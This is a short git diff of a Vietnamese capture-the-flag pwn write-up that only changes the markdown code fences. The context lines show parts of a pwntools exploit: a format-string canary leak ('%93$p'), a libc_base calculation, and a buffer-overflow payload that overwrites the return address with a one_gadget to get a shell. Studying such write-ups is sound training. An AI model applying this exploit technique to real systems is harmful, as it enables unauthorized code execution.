@@ -35,7 +35,7 @@ giá trị canary nằm ở đây
 
 e chỉ cần lấy địa chỉ của libc_start_main trừ đi cái này là ra cái offset, xong lấy offset đó cộng với địa chỉ libc_start_main trong script là có thể leak địa chỉ libc_base
 ## Bước 2 viết scripts
-'''python
+```python
 
 #!/bin/python3
 from pwn import *
@@ -63,7 +63,7 @@ one_gadget = libc_base + 0xfabcf
 payload = b'A'*40 + p64(canary) +p64(0) + p64(one_gadget)
 #b'%93$p'
 p.interactive()
-'''
+```
 khi chạy ta lấy được những địa chỉ mà ta muốn 
 
 
